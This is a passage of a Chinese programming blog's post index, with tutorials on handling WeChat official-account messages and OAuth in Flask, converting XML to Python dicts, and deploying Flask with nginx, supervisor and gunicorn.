debug=True)注意：比较常见的错误是：TypeError: Unicode-objects must be encoded before hashing，则是因为需要指定加密字符串的编码，文中的temp.encode(&#39;utf8&#39;)就是解决这个错误的。当接入生效后，测试平台网页上会显示“配置成功”问题：python 代码在后台运行，假设在代码中想查看获取到的某个变量的值，使用print()函数输出，但是如何查看这个输出呢？我这边的解决办法是本地调试，然后上传代码到服务器。具体来说如下：1、本地也搭建好环境，目录结构跟服务器上面的一样，但是本地代码中运行的端口是80，服务器代码中是80002、使用frpc的方式，给本地环境也配置一个外网访问域名。3、测试公众号这边配置的话，先配置本地的这个域名，进行调试测试，没问题的话把代码中的端口修改成8000，然后上传到服务器。然后再在测试公众号上修改这个URL地址为服务器上的域名。4、本地代码再结合Git使用，效果更佳公众号接收与发送消息1. 接收普通消息当普通微信用户向公众账号发消息时，微信服务器将POST消息的XML数据包到开发者填写的URL上。微信服务器在五秒内收不到响应会断掉连接，并且重新发起请求，总共重试三次。假如服务器无法保证在五秒内处理并回复，可以直接回复空串，微信服务器不会对此作任何处理，并且不会发起重试。各消息类型的推送使用XML数据包结构，如：12345678&lt;xml&gt;&lt;ToUserName&gt;&lt;![CDATA[gh_866835093fea]]&gt;&lt;/ToUserName&gt;&lt;FromUserName&gt;&lt;![CDATA[ogdotwSc_MmEEsJs9-ABZ1QL_4r4]]&gt;&lt;/FromUserName&gt;&lt;CreateTime&gt;1478317060&lt;/CreateTime&gt;&lt;MsgType&gt;&lt;![CDATA[text]]&gt;&lt;/MsgType&gt;&lt;Content&gt;&lt;![CDATA[你好]]&gt;&lt;/Content&gt;&lt;MsgId&gt;6349323426230210995&lt;/MsgId&gt;&lt;/xml&gt;注意：&lt;![CDATA 与 ]]&gt; 括起来的数据不会被xml解析器解析。普通消息类别文本消息图片消息语音消息视频消息小视频消息地理位置消息链接消息文本消息微信post过来的文本xml数据格式如下：12345678&lt;xml&gt; &lt;ToUserName&gt;&lt;![CDATA[toUser]]&gt;&lt;/ToUserName&gt; &lt;FromUserName&gt;&lt;![CDATA[fromUser]]&gt;&lt;/FromUserName&gt; &lt;CreateTime&gt;1348831860&lt;/CreateTime&gt; &lt;MsgType&gt;&lt;![CDATA[text]]&gt;&lt;/MsgType&gt; &lt;Content&gt;&lt;![CDATA[this is a test]]&gt;&lt;/Content&gt; &lt;MsgId&gt;1234567890123456&lt;/MsgId&gt;&lt;/xml&gt;参数描述ToUserName开发者微信号FromUserName发送方帐号（一个OpenID）CreateTime消息创建时间 （整型）MsgType消息类型，文本为textContent文本消息内容MsgId消息id，64位整型2. 被动回复消息当用户发送消息给公众号时（或某些特定的用户操作引发的事件推送时），会产生一个POST请求，开发者可以在响应包中返回特定XML结构，来对该消息进行响应（现支持回复文本、图片、图文、语音、视频、音乐）。严格来说，发送被动响应消息其实并不是一种接口，而是对微信服务器发过来消息的一次回复。假如服务器无法保证在五秒内处理并回复，必须做出下述回复，这样微信服务器才不会对此作任何处理，并且不会发起重试（这种情况下，可以使用客服消息接口进行异步回复），否则，将出现严重的错误提示。详见下面说明：（推荐方式）直接回复success直接回复空串（指字节长度为0的空字符串，而不是XML结构体中content字段的内容为空）一旦遇到以下情况，微信都会在公众号会话中，向用户下发系统提示“该公众号暂时无法提供服务，请稍后再试”：开发者在5秒内未回复任何内容开发者回复了异常数据，比如JSON数据等回复的消息类型文本消息图片消息语音消息视频消息音乐消息图文消息回复文本消息1234567&lt;xml&gt;&lt;ToUserName&gt;&lt;![CDATA[toUser]]&gt;&lt;/ToUserName&gt;&lt;FromUserName&gt;&lt;![CDATA[fromUser]]&gt;&lt;/FromUserName&gt;&lt;CreateTime&gt;12345678&lt;/CreateTime&gt;&lt;MsgType&gt;&lt;![CDATA[text]]&gt;&lt;/MsgType&gt;&lt;Content&gt;&lt;![CDATA[你好]]&gt;&lt;/Content&gt;&lt;/xml&gt;参数是否必须描述ToUserName是接收方帐号（收到的OpenID）FromUserName是开发者微信号CreateTime是消息创建时间 （整型）MsgType是消息类型，文本为textContent是回复的消息内容（换行：在content中能够换行，微信客户端就支持换行显示）3. 代码实现还在原来的路径下，若是get请求，则是进行服务器验证，参考上一步的处理。若是post请求，则进一步处理。实现的业务逻辑类似与“鹦鹉学舌”，用户发什么内容，我们就传回什么内容。详看代码：12345678910111213141516171819202122232425262728293031# 根据请求方式进行判断if request.method == 'POST': 获取微信服务器post过来的xml数据 xml = request.data # 把xml格式的数据进行处理，转换成字典进行取值 req = xmltodict.parse(xml)['xml'] # 判断post过来的数据中数据类型是不是文本 if 'text' == req.get('MsgType'): # 获取用户的信息，开始构造返回数据，把用户发送的信息原封不动的返回过去，字典格式 resp = &#123; 'ToUserName':req.get('FromUserName'), 'FromUserName':req.get('ToUserName'), 'CreateTime':int(time.time()), 'MsgType':'text', 'Content':req.get('Content') &#125; # 把构造的字典转换成xml格式 xml = xmltodict.unparse(&#123;'xml':resp&#125;) # print(req.get('Content')) # 返回数据 return xml else: resp = &#123; 'ToUserName': req.get('FromUserName', ''), 'FromUserName': req.get('ToUserName', ''), 'CreateTime': int(time.time()), 'MsgType': 'text', 'Content': 'I LOVE ITCAST' &#125; xml = xmltodict.unparse(&#123;'xml':resp&#125;) return xml注意：QQ表情实际上是字符串转义，仍属于文本消息emoji表情本质是Unicode字符，也属于文本消息自定义表情：既不是文本，也不是图片，而是一种不支持的格式，微信未提供处理该消息的接口完整代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#!/usr/bin/env python# -*- coding: utf-8 -*-from flask import Flask, request, make_responseimport hashlibimport xmltodictimport timeapp = Flask(__name__)@app.route('/',methods=['GET','POST'])def index(): if request.method =='GET': # 设置token,开发者配置中心使用 token = 'wechat_pro' # 获取微信服务器发送过来的参数 data = request.args signature = data.get('signature') timestamp = data.get('timestamp') nonce = data.get('nonce') echostr = data.get('echostr') # 对参数进行字典排序，拼接字符串 temp = [timestamp, nonce, token] temp.sort() temp = ''.join(temp) # 加密 if (hashlib.sha1(temp.encode('utf8')).hexdigest() == signature): return echostr else: return 'error', 403 # 根据请求方式进行判断 if request.method == 'POST': 获取微信服务器post过来的xml数据 xml = request.data # 把xml格式的数据进行处理，转换成字典进行取值 req = xmltodict.parse(xml)['xml'] # 判断post过来的数据中数据类型是不是文本 if 'text' == req.get('MsgType'): # 获取用户的信息，开始构造返回数据，把用户发送的信息原封不动的返回过去，字典格式 resp = &#123; 'ToUserName':req.get('FromUserName'), 'FromUserName':req.get('ToUserName'), 'CreateTime':int(time.time()), 'MsgType':'text', 'Content':req.get('Content') &#125; # 把构造的字典转换成xml格式 xml = xmltodict.unparse(&#123;'xml':resp&#125;) # print(req.get('Content')) # 返回数据 return xml else: resp = &#123; 'ToUserName': req.get('FromUserName', ''), 'FromUserName': req.get('ToUserName', ''), 'CreateTime': int(time.time()), 'MsgType': 'text', 'Content': 'I LOVE ITCAST' &#125; xml = xmltodict.unparse(&#123;'xml':resp&#125;) return xmlif __name__ == '__main__': app.run(host='0.0.0.0', port=8000, debug=True)4. 接收其他普通消息接收图片消息123456789&lt;xml&gt;&lt;ToUserName&gt;&lt;![CDATA[toUser]]&gt;&lt;/ToUserName&gt;&lt;FromUserName&gt;&lt;![CDATA[fromUser]]&gt;&lt;/FromUserName&gt;&lt;CreateTime&gt;1348831860&lt;/CreateTime&gt;&lt;MsgType&gt;&lt;![CDATA[image]]&gt;&lt;/MsgType&gt;&lt;PicUrl&gt;&lt;![CDATA[this is a url]]&gt;&lt;/PicUrl&gt;&lt;MediaId&gt;&lt;![CDATA[media_id]]&gt;&lt;/MediaId&gt;&lt;MsgId&gt;1234567890123456&lt;/MsgId&gt;&lt;/xml&gt;参数描述ToUserName开发者微信号FromUserName发送方帐号（一个OpenID）CreateTime消息创建时间 （整型）MsgTypeimagePicUrl图片链接MediaId图片消息媒体id，可以调用多媒体文件下载接口拉取数据。MsgId消息id，64位整型接收视频消息123456789&lt;xml&gt;&lt;ToUserName&gt;&lt;![CDATA[toUser]]&gt;&lt;/ToUserName&gt;&lt;FromUserName&gt;&lt;![CDATA[fromUser]]&gt;&lt;/FromUserName&gt;&lt;CreateTime&gt;1357290913&lt;/CreateTime&gt;&lt;MsgType&gt;&lt;![CDATA[video]]&gt;&lt;/MsgType&gt;&lt;MediaId&gt;&lt;![CDATA[media_id]]&gt;&lt;/MediaId&gt;&lt;ThumbMediaId&gt;&lt;![CDATA[thumb_media_id]]&gt;&lt;/ThumbMediaId&gt;&lt;MsgId&gt;1234567890123456&lt;/MsgId&gt;&lt;/xml&gt;参数描述ToUserName开发者微信号FromUserName发送方帐号（一个OpenID）CreateTime消息创建时间 （整型）MsgType视频为videoMediaId视频消息媒体id，可以调用多媒体文件下载接口拉取数据。ThumbMediaId视频消息缩略图的媒体id，可以调用多媒体文件下载接口拉取数据。MsgId消息id，64位整型接收小视频消息123456789&lt;xml&gt;&lt;ToUserName&gt;&lt;![CDATA[toUser]]&gt;&lt;/ToUserName&gt;&lt;FromUserName&gt;&lt;![CDATA[fromUser]]&gt;&lt;/FromUserName&gt;&lt;CreateTime&gt;1357290913&lt;/CreateTime&gt;&lt;MsgType&gt;&lt;![CDATA[shortvideo]]&gt;&lt;/MsgType&gt;&lt;MediaId&gt;&lt;![CDATA[media_id]]&gt;&lt;/MediaId&gt;&lt;ThumbMediaId&gt;&lt;![CDATA[thumb_media_id]]&gt;&lt;/ThumbMediaId&gt;&lt;MsgId&gt;1234567890123456&lt;/MsgId&gt;&lt;/xml&gt;参数描述ToUserName开发者微信号FromUserName发送方帐号（一个OpenID）CreateTime消息创建时间 （整型）MsgType小视频为shortvideoMediaId视频消息媒体id，可以调用多媒体文件下载接口拉取数据。ThumbMediaId视频消息缩略图的媒体id，可以调用多媒体文件下载接口拉取数据。MsgId消息id，64位整型接收语音消息123456789&lt;xml&gt;&lt;ToUserName&gt;&lt;![CDATA[toUser]]&gt;&lt;/ToUserName&gt;&lt;FromUserName&gt;&lt;![CDATA[fromUser]]&gt;&lt;/FromUserName&gt;&lt;CreateTime&gt;1357290913&lt;/CreateTime&gt;&lt;MsgType&gt;&lt;![CDATA[voice]]&gt;&lt;/MsgType&gt;&lt;MediaId&gt;&lt;![CDATA[media_id]]&gt;&lt;/MediaId&gt;&lt;Format&gt;&lt;![CDATA[Format]]&gt;&lt;/Format&gt;&lt;MsgId&gt;1234567890123456&lt;/MsgId&gt;&lt;/xml&gt;参数描述ToUserName开发者微信号FromUserName发送方帐号（一个OpenID）CreateTime消息创建时间 （整型）MsgType语音为voiceMediaId语音消息媒体id，可以调用多媒体文件下载接口拉取数据。Format语音格式，如amr，speex等MsgID消息id，64位整型请注意，开通语音识别后，用户每次发送语音给公众号时，微信会在推送的语音消息XML数据包中，增加一个Recongnition字段（注：由于客户端缓存，开发者开启或者关闭语音识别功能，对新关注者立刻生效，对已关注用户需要24小时生效。开发者可以重新关注此帐号进行测试）。开启语音识别后的语音XML数据包如下：12345678910&lt;xml&gt;&lt;ToUserName&gt;&lt;![CDATA[toUser]]&gt;&lt;/ToUserName&gt;&lt;FromUserName&gt;&lt;![CDATA[fromUser]]&gt;&lt;/FromUserName&gt;&lt;CreateTime&gt;1357290913&lt;/CreateTime&gt;&lt;MsgType&gt;&lt;![CDATA[voice]]&gt;&lt;/MsgType&gt;&lt;MediaId&gt;&lt;![CDATA[media_id]]&gt;&lt;/MediaId&gt;&lt;Format&gt;&lt;![CDATA[Format]]&gt;&lt;/Format&gt;&lt;Recognition&gt;&lt;![CDATA[腾讯微信团队]]&gt;&lt;/Recognition&gt;&lt;MsgId&gt;1234567890123456&lt;/MsgId&gt;&lt;/xml&gt;多出的字段中，Format为语音格式，一般为amr，Recognition为语音识别结果，使用UTF8编码。5.回复其他普通消息回复图片消息123456789&lt;xml&gt;&lt;ToUserName&gt;&lt;![CDATA[toUser]]&gt;&lt;/ToUserName&gt;&lt;FromUserName&gt;&lt;![CDATA[fromUser]]&gt;&lt;/FromUserName&gt;&lt;CreateTime&gt;12345678&lt;/CreateTime&gt;&lt;MsgType&gt;&lt;![CDATA[image]]&gt;&lt;/MsgType&gt;&lt;Image&gt;&lt;MediaId&gt;&lt;![CDATA[media_id]]&gt;&lt;/MediaId&gt;&lt;/Image&gt;&lt;/xml&gt;参数是否必须说明ToUserName是接收方帐号（收到的OpenID）FromUserName是开发者微信号CreateTime是消息创建时间 （整型）MsgType是imageMediaId是通过素材管理接口上传多媒体文件，得到的id。回复语音消息123456789&lt;xml&gt;&lt;ToUserName&gt;&lt;![CDATA[toUser]]&gt;&lt;/ToUserName&gt;&lt;FromUserName&gt;&lt;![CDATA[fromUser]]&gt;&lt;/FromUserName&gt;&lt;CreateTime&gt;12345678&lt;/CreateTime&gt;&lt;MsgType&gt;&lt;![CDATA[voice]]&gt;&lt;/MsgType&gt;&lt;Voice&gt;&lt;MediaId&gt;&lt;![CDATA[media_id]]&gt;&lt;/MediaId&gt;&lt;/Voice&gt;&lt;/xml&gt;参数是否必须说明ToUserName是接收方帐号（收到的OpenID）FromUserName是开发者微信号CreateTime是消息创建时间戳 （整型）MsgType是语音，voiceMediaId是通过素材管理接口上传多媒体文件，得到的id回复视频消息1234567891011&lt;xml&gt;&lt;ToUserName&gt;&lt;![CDATA[toUser]]&gt;&lt;/ToUserName&gt;&lt;FromUserName&gt;&lt;![CDATA[fromUser]]&gt;&lt;/FromUserName&gt;&lt;CreateTime&gt;12345678&lt;/CreateTime&gt;&lt;MsgType&gt;&lt;![CDATA[video]]&gt;&lt;/MsgType&gt;&lt;Video&gt;&lt;MediaId&gt;&lt;![CDATA[media_id]]&gt;&lt;/MediaId&gt;&lt;Title&gt;&lt;![CDATA[title]]&gt;&lt;/Title&gt;&lt;Description&gt;&lt;![CDATA[description]]&gt;&lt;/Description&gt;&lt;/Video&gt; &lt;/xml&gt;参数是否必须说明ToUserName是接收方帐号（收到的OpenID）FromUserName是开发者微信号CreateTime是消息创建时间 （整型）MsgType是videoMediaId是通过素材管理接口上传多媒体文件，得到的idTitle否视频消息的标题Description否视频消息的描述可以使用微信提供的网页调试工具进行测试：https://mp.weixin.qq.com/debug/cgi-bin/apiinfo?t=index关注/取消关注事件用户在关注与取消关注公众号时，微信会把这个事件推送到开发者填写的URL。微信服务器在五秒内收不到响应会断掉连接，并且重新发起请求，总共重试三次。假如服务器无法保证在五秒内处理并回复，可以直接回复空串，微信服务器不会对此作任何处理，并且不会发起重试。1234567&lt;xml&gt;&lt;ToUserName&gt;&lt;![CDATA[toUser]]&gt;&lt;/ToUserName&gt;&lt;FromUserName&gt;&lt;![CDATA[FromUser]]&gt;&lt;/FromUserName&gt;&lt;CreateTime&gt;123456789&lt;/CreateTime&gt;&lt;MsgType&gt;&lt;![CDATA[event]]&gt;&lt;/MsgType&gt;&lt;Event&gt;&lt;![CDATA[subscribe]]&gt;&lt;/Event&gt;&lt;/xml&gt;参数描述ToUserName开发者微信号FromUserName发送方帐号（一个OpenID）CreateTime消息创建时间 （整型）MsgType消息类型，eventEvent事件类型，subscribe(订阅)、unsubscribe(取消订阅)代码实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#!/usr/bin/env python# -*- coding: utf-8 -*-from flask import Flask, request, make_responseimport hashlibimport xmltodictimport timeimport requestsimport jsonapp = Flask(__name__)@app.route('/',methods=['GET','POST'])def index(): if request.method =='GET': # 设置token,开发者配置中心使用 token = 'wechat_pro' # 获取微信服务器发送过来的参数 data = request.args signature = data.get('signature') timestamp = data.get('timestamp') nonce = data.get('nonce') echostr = data.get('echostr') # 对参数进行字典排序，拼接字符串 temp = [timestamp, nonce, token] temp.sort() temp = ''.join(temp) # 加密 if (hashlib.sha1(temp.encode('utf8')).hexdigest() == signature): return echostr else: return 'error', 403 if request.method == 'POST': xml = request.data req = xmltodict.parse(xml)['xml'] # print(req) MsgType = req.get('MsgType') if 'text' == MsgType: resp = &#123; 'ToUserName':req.get('FromUserName'), 'FromUserName':req.get('ToUserName'), 'CreateTime':int(time.time()), 'MsgType':'text', 'Content':'这是一个文本消息！' &#125; elif 'event' == MsgType: if "subscribe" == req.get("Event"): resp = &#123; "ToUserName":req.get("FromUserName", ""), "FromUserName":req.get("ToUserName", ""), "CreateTime":int(time.time()), "MsgType":"text", "Content":u"感谢您的关注！" &#125; else: resp = None else: resp = &#123; 'ToUserName': req.get('FromUserName', ''), 'FromUserName': req.get('ToUserName', ''), 'CreateTime': int(time.time()), 'MsgType': 'text', 'Content': '无法识别该消息!' &#125; xml = xmltodict.unparse(&#123;'xml': resp&#125;) return xmlif __name__ == '__main__': app.run(host='0.0.0.0', port=80, debug=True)微信网页授权现在，我们要实现一个微信内网页，通过微信访问网页时，网页会展示微信用户的个人信息。因为涉及到用户的个人信息，所以需要有用户授权才可以。当用户授权后，我们的网页服务器（开发者服务器）会拿到用户的“授权书”（code）,我们用这个code向微信服务器领取访问令牌（accecc_token）和用户的身份号码（openid)，然后凭借access_token和openid向微信服务器提取用户的个人信息。第一步：用户同意授权，获取code第二步：通过code换取网页授权access_token第三步：拉取用户信息(需scope为 snsapi_userinfo)那么，如何拿到用户的授权code呢？授权是由微信发起让用户进行确认，在这个过程中是微信在与用户进行交互，所以用户应该先访问微信的内容，用户确认后再由微信将用户导向到我们的网页链接地址，并携带上code参数。我们把这个过程叫做网页回调，类似于我们在程序编写时用到的回调函数，都是回调的思想。1. 设置网页授权回调域名在微信公众号请求用户网页授权之前，开发者需要先到公众平台官网中的开发者中心页配置授权回调域名。请注意，这里填写的是域名（是一个字符串），而不是URL，因此请勿加 http:// 等协议头；授权回调域名配置规范为全域名，比如需要网页授权的域名为：www.qq.com，配置以后此域名下面的页面http://www.qq.com/music.html 、 http://www.qq.com/login.html 都可以进行OAuth2.0鉴权。但http://pay.qq.com 、 http://music.qq.com 、 http://qq.com无法进行OAuth2.0鉴权。2. 用户同意授权，获取code让用户访问一下链接地址：https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&amp;redirect_uri=REDIRECT_URI&amp;response_type=code&amp;scope=SCOPE&amp;state=STATE#wechat_redirect下图为scope等于snsapi_userinfo时的授权页面：用户同意授权后如果用户同意授权，页面将跳转至 redirect_uri/?code=CODE&amp;state=STATE。若用户禁止授权，则重定向后不会带上code参数，仅会带上state参数redirect_uri?state=STATE3. 通过code换取网页授权access_token请求方法https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;secret=SECRET&amp;code=CODE&amp;grant_type=authorization_code参数说明返回值正确时返回的JSON数据包如下：1234567&#123; "access_token":"ACCESS_TOKEN", "expires_in":7200, "refresh_token":"REFRESH_TOKEN", "openid":"OPENID", "scope":"SCOPE"&#125;错误时微信会返回JSON数据包如下（示例为Code无效错误）:1234&#123; "errcode":40029, "errmsg":"invalid code"&#125;4. 拉取用户信息(需scope为 snsapi_userinfo)请求方法https://api.weixin.qq.com/sns/userinfo?access_token=ACCESS_TOKEN&amp;openid=OPENID&amp;lang=zh_CN参数说明返回值正确时返回的JSON数据包如下：1234567891011121314&#123; "openid":" OPENID", " nickname": NICKNAME, "sex":"1", "province":"PROVINCE" "city":"CITY", "country":"COUNTRY", "headimgurl": "http://wx.qlogo.cn/mmopen/g3MonUZtNHkdmzicIlibx6iaFqAc56vxLSUfpb6n5WKSYVY0ChQKkiaJSgQ1dZuTOgvLLrhJbERQQ4eMsv84eavHiaiceqxibJxCfHe/46", "privilege":[ "PRIVILEGE1" "PRIVILEGE2" ], "unionid": "o6_bmasdasdsad6_2sgVt7hMZOPfL"&#125;错误时微信会返回JSON数据包如下:1234&#123; "errcode":40003, "errmsg":" invalid openid "&#125;]]></content>
      <categories>
        <category>Python</category>
        <category>flask</category>
        <category>微信公众号</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>flask</tag>
        <tag>微信公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xml与Python字典格式相互转换的两种方式]]></title>
    <url>%2F2019%2F06%2F26%2Fxml%E4%B8%8EPython%E5%AD%97%E5%85%B8%E6%A0%BC%E5%BC%8F%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[第一种方式1. dict转xml1234567891011121314151617181920212223242526272829303132def dict_to_xml(dict_data): xml = ["&lt;xml&gt;"] for k, v in dict_data.items(): xml.append("&lt;&#123;0&#125;&gt;&#123;1&#125;&lt;/&#123;0&#125;&gt;".format(k, v)) xml.append("&lt;/xml&gt;") return "".join(xml)dict_data = &#123; "ToUserName" : "gh_866835093fea", "FromUserName" : "ogdotwSc_MmEEsJs9-ABZ1QL_4r4", "CreateTime" : "1478317060", "MsgType" : "text", "Content" : "你好", "MsgId" : "6349323426230210995",&#125;print(dict_to_xml(dict_data))"""&lt;xml&gt;&lt;ToUserName&gt;gh_866835093fea&lt;/ToUserName&gt;&lt;FromUserName&gt;ogdotwSc_MmEEsJs9-ABZ1QL_4r4&lt;/FromUserName&gt;&lt;CreateTime&gt;1478317060&lt;/CreateTime&gt;&lt;MsgType&gt;text&lt;/MsgType&gt;&lt;Content&gt;你好&lt;/Content&gt;&lt;MsgId&gt;6349323426230210995&lt;/MsgId&gt;&lt;/xml&gt;""""""&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;xml&gt; &lt;ToUserName&gt;gh_866835093fea&lt;/ToUserName&gt; &lt;FromUserName&gt;ogdotwSc_MmEEsJs9-ABZ1QL_4r4&lt;/FromUserName&gt; &lt;CreateTime&gt;1478317060&lt;/CreateTime&gt; &lt;MsgType&gt;text&lt;/MsgType&gt; &lt;Content&gt;你好&lt;/Content&gt; &lt;MsgId&gt;6349323426230210995&lt;/MsgId&gt;&lt;/xml&gt;"""2. xml转dict12345678910111213141516171819202122def xml_to_dict(xml_data): xml_dict = &#123;&#125; root = ET.fromstring(xml_data) for child in root: xml_dict[child.tag] = child.text return xml_dictxml_data = """&lt;xml&gt; &lt;ToUserName&gt;gh_866835093fea&lt;/ToUserName&gt; &lt;FromUserName&gt;ogdotwSc_MmEEsJs9-ABZ1QL_4r4&lt;/FromUserName&gt; &lt;CreateTime&gt;1478317060&lt;/CreateTime&gt; &lt;MsgType&gt;text&lt;/MsgType&gt; &lt;Content&gt;你好&lt;/Content&gt; &lt;MsgId&gt;6349323426230210995&lt;/MsgId&gt;&lt;/xml&gt;"""print(xml_to_dict(xml_data))"""&#123;'ToUserName': 'gh_866835093fea', 'FromUserName': 'ogdotwSc_MmEEsJs9-ABZ1QL_4r4', 'CreateTime': '1478317060', 'MsgType': 'text', 'Content': '你好', 'MsgId': '6349323426230210995'&#125;"""第二种方式xmltodict 是一个用来处理xml数据的很方便的模块。包含两个常用方法parse和unparsepip install xmltodict1. parse()方法-xml转dictxmltodict.parse()方法可以将xml数据转为python中的dict字典数据：1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python# -*- coding: utf-8 -*-import xmltodictxml_str = """&lt;xml&gt;&lt;ToUserName&gt;&lt;![CDATA[gh_866835093fea]]&gt;&lt;/ToUserName&gt;&lt;FromUserName&gt;&lt;![CDATA[ogdotwSc_MmEEsJs9-ABZ1QL_4r4]]&gt;&lt;/FromUserName&gt;&lt;CreateTime&gt;1478317060&lt;/CreateTime&gt;&lt;MsgType&gt;&lt;![CDATA[text]]&gt;&lt;/MsgType&gt;&lt;Content&gt;&lt;![CDATA[你好]]&gt;&lt;/Content&gt;&lt;MsgId&gt;6349323426230210995&lt;/MsgId&gt;&lt;/xml&gt; """xml_dict = xmltodict.parse(xml_str)# print(xml_dict)# OrderedDict([('xml', OrderedDict([('ToUserName', 'gh_866835093fea'), ('FromUserName', 'ogdotwSc_MmEEsJs9-ABZ1QL_4r4'), ('CreateTime', '1478317060'), ('MsgType', 'text'), ('Content', '你好'), ('MsgId', '6349323426230210995')]))])# print(xml_dict['xml'])# OrderedDict([('ToUserName', 'gh_866835093fea'), ('FromUserName', 'ogdotwSc_MmEEsJs9-ABZ1QL_4r4'), ('CreateTime', '1478317060'), ('MsgType', 'text'), ('Content', '你好'), ('MsgId', '6349323426230210995')])for key, val in xml_dict['xml'].items(): print(key, "=", val)"""ToUserName = gh_866835093feaFromUserName = ogdotwSc_MmEEsJs9-ABZ1QL_4r4CreateTime = 1478317060MsgType = textContent = 你好MsgId = 6349323426230210995"""2. unparse()方法-dict转xmlxmltodict.unparse()方法可以将字典转换为xml字符串：12345678910111213141516171819202122232425262728293031323334import xmltodictxml_dict = &#123; "xml": &#123; "ToUserName" : "gh_866835093fea", "FromUserName" : "ogdotwSc_MmEEsJs9-ABZ1QL_4r4", "CreateTime" : "1478317060", "MsgType" : "text", "Content" : u"你好", "MsgId" : "6349323426230210995", &#125;&#125;# xml_str = xmltodict.unparse(xml_dict)# print(xml_str)"""&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;xml&gt;&lt;ToUserName&gt;gh_866835093fea&lt;/ToUserName&gt;&lt;FromUserName&gt;ogdotwSc_MmEEsJs9-ABZ1QL_4r4&lt;/FromUserName&gt;&lt;CreateTime&gt;1478317060&lt;/CreateTime&gt;&lt;MsgType&gt;text&lt;/MsgType&gt;&lt;Content&gt;你好&lt;/Content&gt;&lt;MsgId&gt;6349323426230210995&lt;/MsgId&gt;&lt;/xml&gt;"""xml_str = xmltodict.unparse(xml_dict, pretty=True) # pretty表示友好输出print(xml_str)"""&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;xml&gt; &lt;ToUserName&gt;gh_866835093fea&lt;/ToUserName&gt; &lt;FromUserName&gt;ogdotwSc_MmEEsJs9-ABZ1QL_4r4&lt;/FromUserName&gt; &lt;CreateTime&gt;1478317060&lt;/CreateTime&gt; &lt;MsgType&gt;text&lt;/MsgType&gt; &lt;Content&gt;你好&lt;/Content&gt; &lt;MsgId&gt;6349323426230210995&lt;/MsgId&gt;&lt;/xml&gt;"""]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx+supervisor+gunicorn+flask部署教程]]></title>
    <url>%2F2019%2F06%2F24%2Fnginx-supervisor-gunicorn-flask%E9%83%A8%E7%BD%B2%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[说明本文采用虚拟环境的方式，方便部署多个项目。1. 安装Python3此步骤可以查看我的博客：https://blog.ejubei.net/2019/03/14/CentOS%207.2%E5%AE%89%E8%A3%85Python3.7/最终的效果：1234567891011[root@localhost ~]# python3 -VPython 3.7.1[root@localhost ~]# pip3 -Vpip 19.1.1 from /usr/local/python3/lib/python3.7/site-packages/pip (python 3.7)[root@localhost ~]# python -VPython 2.7.5[root@localhost ~]# pip -V # 默认python2.7未安装pip-bash: pip: command not found# 安装方法[root@localhost ~]# yum install epel-release[root@localhost ~]# yum install python-pip2. 创建项目目录，安装虚拟环境创建项目目录，安装虚拟环境[root@localhost ~]# mkdir –p /home/microblog &amp;&amp; cd /home/microblog &amp;&amp; python3 -m venv venv激活虚拟环境，安装项目所需的依赖包需要事先把requirements.txt放入项目所在目录中[root@localhost microblog]# source venv/bin/activate(venv) [root@localhost microblog]# pip3 install -r requirements.txt上传项目代码演示使用，本例用一个最简单的flask应用：mocroblog.py1234567891011#!/usr/bin/env pythonfrom flask import Flaskapp = Flask(__name__)@app.route('/')@app.route('/index')def index(): return 'Hello World!'if __name__ == '__main__': app.run(host='0.0.0.0')测试1234567(venv) [root@localhost microblog]# python3 microblog.py* Serving Flask app "microblog" (lazy loading)* Environment: productionWARNING: Do not use the development server in a production environment.Use a production WSGI server instead.* Debug mode: off* Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)再打开一个窗口，运行：1234567[root@localhost ~]# curl -i http://127.0.0.1:5000HTTP/1.0 200 OKContent-Type: text/html; charset=utf-8Content-Length: 12Server: Werkzeug/0.14.1 Python/3.7.0Date: Sat, 07 Jul 2018 03:52:31 GMTHello World!一切正常！3. 安装项目使用的web服务安装nginx[root@localhost ~]# yum install nginx默认安装目录：/etc/nginx安装supervisor注意：此软件要求系统Python版本不能高于3[root@localhost ~]# yum install supervisor安装gunicorn注意，这个要安装在项目使用的虚拟环境中123[root@localhost nginx]# cd /home/microblog/[root@localhost microblog]# source venv/bin/activate(venv) [root@localhost microblog]# pip3 install gunicorn五. 相关配置文件设置nginx相关配置把/etc/nginx/nginx.conf中server{}块注释，在/etc/nginx/conf.d/目录中添加项目使用的以conf结尾的文件，比如：m.conf，内容如下：1234567891011121314151617181920server &#123; listen 80; #nginx监听端口 server_name 192.168.109.128; #域名或IP location / &#123; proxy_pass http://127.0.0.1:9000; #监听代理端口 proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;&#125;# 检测Nginx配置是否正确[root@localhost conf.d]# nginx -tnginx: the configuration file /etc/nginx/nginx.conf syntax is oknginx: configuration file /etc/nginx/nginx.conf test is successful# 启动Nginx[root@localhost conf.d]# systemctl start nginx.service # 查看Nginx状态[root@localhost conf.d]# systemctl status nginx.servicesupervisor配置默认配置文件：(1)/etc/supervisord.conf，在该文件最后一行有这样的信息：12[include]files = supervisord.d/*.ini也就说我们在这个目录下创建一个以ini结尾的文件即可比如：/etc/supervisord.d/m.ini其内容如下：1234567891011121314[program:microblog]directory = /home/microblogcommand = /home/microblog/venv/bin/gunicorn -b 127.0.0.1:9000 -w 2 microblog:app #一定要是虚拟环境中的绝对路径user = rootautostart = trueautorestart = truestopasgroup = truekillasgroup = truestartsecs = 5startretries = 3redirect_stderr = truestdout_logfile_maxbytes = 20MBstdout_logfile_backups = 20stdout_logfile = 